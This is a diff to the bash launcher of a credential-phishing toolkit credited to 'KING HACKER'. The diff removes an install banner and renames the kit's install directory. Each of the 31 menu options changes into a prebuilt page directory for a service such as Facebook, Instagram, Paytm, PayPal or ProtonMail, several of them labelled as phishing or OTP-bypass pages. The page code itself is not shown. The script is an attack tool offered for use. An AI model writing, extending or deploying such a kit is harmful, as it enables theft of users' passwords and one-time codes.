@@ -10,34 +10,7 @@
 #       created by :- KING HACKER            #
 #                                            #
 ##############################################
-spinlong ()
-{
-    echo -e "\n"
-    bar=" Thanks for installing my tool................... "
-    barlength=${#bar}
-    i=0
-    while ((i < 100)); do
-        n=$((i*barlength / 100))
-        printf "\e[00;32m\r%-${barlength}s\e[00m" "${bar:0:n}"
-        ((i += RANDOM%5+2))
-        sleep 0.02
-    done
-}
-spinlong2 ()
-{
-    echo -e "\n"
-    bar=" enjoy the tool 😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂. "
-    barlength=${#bar}
-    i=0
-    while ((i < 100)); do
-        n=$((i*barlength / 100))
-        printf "\e[00;32m\r%-${barlength}s\e[00m" "${bar:0:n}"
-        ((i += RANDOM%5+2))
-        sleep 0.02
-    done
-}
-spinlong
-spinlong2
+
 clear
 echo ""
 echo ""
@@ -316,7 +289,7 @@ ash() {
 	
          if [ $option = 01 ] || [ $option = 1 ]
          then
-	                    cd /usr/bin/phs
+	                    cd /usr/bin/hps
                             cd facebook/
                             echo 
 			    connection
@@ -348,7 +321,7 @@ ash() {
 			     
 	 elif [ $option = 02 ] || [ $option = 2 ]
 	 then
-			   cd /usr/bin/phs
+			   cd /usr/bin/hps
                            cd pinterest/
                            echo 
 			   connection
@@ -380,7 +353,7 @@ ash() {
 
 	 elif [ $option = 03 ] || [ $option = 3 ]
 	 then
-		           cd /usr/bin/phs
+		           cd /usr/bin/hps
 			   cd instagram/
 			   echo 
 			   connection
@@ -412,7 +385,7 @@ ash() {
 			   
 	elif [ $option = 04 ] || [ $option = 4 ]
         then
-                          cd /usr/bin/phs
+                          cd /usr/bin/hps
 			  cd UberEats-Phishing/
 			  echo 
 			  connection
@@ -444,7 +417,7 @@ ash() {
 			  
         elif [ $option = 05 ] || [ $option = 5 ]
         then
-                          cd /usr/bin/phs
+                          cd /usr/bin/hps
                           cd ola-otpbypass/
                           echo 
 			  connection
@@ -476,7 +449,7 @@ ash() {
 			  
          elif [ $option = 06 ] || [ $option = 6 ]
 	 then
-                          cd /usr/bin/phs
+                          cd /usr/bin/hps
                           cd google-otp/
                           echo 
 			  connection
@@ -508,7 +481,7 @@ ash() {
 			  
        elif [ $option = 07 ] || [ $option = 7 ]
        then
-                          cd /usr/bin/phs
+                          cd /usr/bin/hps
                           cd Paytm-Phishing/
                           echo 
                           echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign In \e[0m" 
@@ -580,7 +553,7 @@ ash() {
         elif [ $option = 08 ] || [ $option = 8 ]
 	then
 
-                          cd /usr/bin/phs
+                          cd /usr/bin/hps
                           cd Netflix/
                           echo 
 			  connection
@@ -612,7 +585,7 @@ ash() {
 
            elif [ $option = 09 ] || [ $option = 9 ]
 	   then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd instafollow/
                            echo 
 			   connection
@@ -644,7 +617,7 @@ ash() {
 			   
                elif [ $option = 10 ]
 	       then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd amazonsign/
                            echo 
 			   connection
@@ -676,7 +649,7 @@ ash() {
 
                   elif [ $option = 11 ]
 	          then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd whatsapp-phishing/
                            echo 
 			   connection
@@ -708,7 +681,7 @@ ash() {
 			   
 	          elif [ $option = 12 ]
 	          then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd Linkedin/
                            echo 
 			   connection
@@ -740,7 +713,7 @@ ash() {
    
                      elif [ $option = 13 ]
 	             then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd Hotstar-otp-bypass/
                            echo 
 			   connection
@@ -772,7 +745,7 @@ ash() {
       
                     elif [ $option = 14 ]
 	            then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd spotify/
                            echo 
 			   connection
@@ -804,7 +777,7 @@ ash() {
 			   
 	            elif [ $option = 15 ]
 	            then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd github/
                            echo 
 			   connection
@@ -836,7 +809,7 @@ ash() {
 			   
 	        elif [ $option = 16 ]
 	        then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd ipfinder/
                            echo 
 			   connection
@@ -868,7 +841,7 @@ ash() {
 
                   elif [ $option = 17 ]
 	          then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd Zomato-Phishing/
                            echo 
 			   connection
@@ -900,7 +873,7 @@ ash() {
 
                    elif [ $option = 18 ]
 	           then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd phonepay/
                            echo 
 			   connection
@@ -932,7 +905,7 @@ ash() {
 			   
 	            elif [ $option = 19 ]
 	            then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd paypal/
                            echo 
 			   connection
@@ -964,7 +937,7 @@ ash() {
            
 	            elif [ $option = 20 ]
 	            then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd telegram/
                            echo 
 			   connection
@@ -996,7 +969,7 @@ ash() {
 			   
 	            elif [ $option = 21 ]
 	            then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd twitter/
                            echo 
 			   connection
@@ -1028,7 +1001,7 @@ ash() {
                     
 		    elif [ $option = 22 ]
 	            then
-                          cd /usr/bin/phs
+                          cd /usr/bin/hps
                           cd flipcart/
                           echo 
 			  connection
@@ -1060,7 +1033,7 @@ ash() {
        
                   elif [ $option = 23 ]
 	          then
-                          cd /usr/bin/phs
+                          cd /usr/bin/hps
                           cd wordpress/
                           echo 
 			  connection
@@ -1092,7 +1065,7 @@ ash() {
 			  
 	           elif [ $option = 24 ]
 	           then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd snapchat/
                            echo 
 			   connection
@@ -1124,7 +1097,7 @@ ash() {
 			   
 		    elif [ $option = 25 ]
 	            then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd protonmail/
                            echo 
 			   connection
@@ -1156,7 +1129,7 @@ ash() {
 
                   elif [ $option = 26 ]
 	          then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd stackoverflow/
                            echo 
 			   connection
@@ -1188,7 +1161,7 @@ ash() {
 
                   elif [ $option = 27 ]
 	          then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd ebay/
                            echo 
 			   connection
@@ -1220,7 +1193,7 @@ ash() {
 
                   elif [ $option = 28 ]
 	          then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd twitch/
                            echo 
 			   connection
@@ -1252,7 +1225,7 @@ ash() {
                 
 		    elif [ $option = 29 ]
 	            then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd ajio/
                            echo 
 			   connection
@@ -1284,7 +1257,7 @@ ash() {
 			   
 	           elif [ $option = 30 ]
 	           then
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd cryptocurrency/
                            echo 
 			   connection
@@ -1316,7 +1289,7 @@ ash() {
                 
 		  elif [ $option = 31 ]
 	          then               
-                           cd /usr/bin/phs
+                           cd /usr/bin/hps
                            cd mobikwik/
                            echo 
 			   connection
